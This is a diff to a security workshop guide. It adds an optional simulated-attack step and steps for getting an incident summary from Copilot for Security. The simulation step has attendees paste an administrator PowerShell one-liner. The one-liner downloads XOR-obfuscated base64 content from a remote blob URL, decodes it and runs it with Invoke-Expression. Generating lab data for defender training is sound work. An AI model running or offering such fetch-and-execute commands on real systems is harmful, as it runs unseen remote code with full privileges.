@@ -109,6 +109,20 @@ We encourage participants of the upcomingthis CoHack to utilize their own subscr
 
 >**Note**: Don't modify the "user name" parameter
 
+7. OPTIONAL: Simulated Attack for more incident data
+
+   a. Open A-Simulation.txt found in this repository or in the "resources" attendee repository.
+
+   b. Copy the entire content of the TXT file
+
+   c. Open a PowerShell as Administrator or Terminal as Administrator
+
+   d. Run the attack simulation by pasting the following in the window:
+
+   ```powershell
+   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection'); $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content; Try{ $contentBytes =[System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) }; $i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+   ```
+
 # Solution For Challenge 2
 
 ## Unified Security Operations Platform As A Defender
@@ -176,6 +190,28 @@ For more details see: https://learn.microsoft.com/en-us/copilot/security/get-sta
     b. Select an incident and Copilot for Security embedded experience shows up.
 
    ![nmap](./images/cfs-xdr-sentinel.jpg)
+
+## Copilot for Security (CFS) Incident Summary
+
+9. Checking that all Copilot for Security (CFS) plugins are enabled
+
+    a. In Copilot for Security portal, select the prompt bar
+    
+    b. Select the four box icon inside the prompt bar to bring up the plugin window
+
+    ![nmap](./images/cfs-prompt-bar-new.jpg)
+
+    c. Toggle on as many plugins as possible to enrich the CFS session
+
+    ![nmap](./images/cfs-manage-plugins.jpg)
+
+    d. Close the plugin window by accepting the changes
+
+10. Prompting Copilot for Security (CFS) for incident summary
+
+    ![nmap](./images/cfs-copilot-how-it-works.jpg)
+
+    a. 
    
 ## Clean up
 
